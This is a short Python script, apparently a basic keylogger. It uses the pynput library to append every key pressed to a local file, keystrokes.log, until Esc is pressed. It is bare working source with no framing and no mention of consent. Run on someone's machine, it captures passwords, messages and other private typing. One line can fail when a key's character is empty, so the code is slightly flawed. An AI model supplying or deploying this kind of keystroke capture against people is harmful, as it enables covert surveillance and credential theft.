from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keystrokes.log"

# Function to write keystrokes to the log file
def on_press(key):
    with open(log_file, 'a') as f:
        # Check if the key is printable
        if hasattr(key, 'char'):
            f.write("'" + key.char + "' ")
        else:
            f.write(str(key) + " ")

# Function to stop the listener
def on_release(key):
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



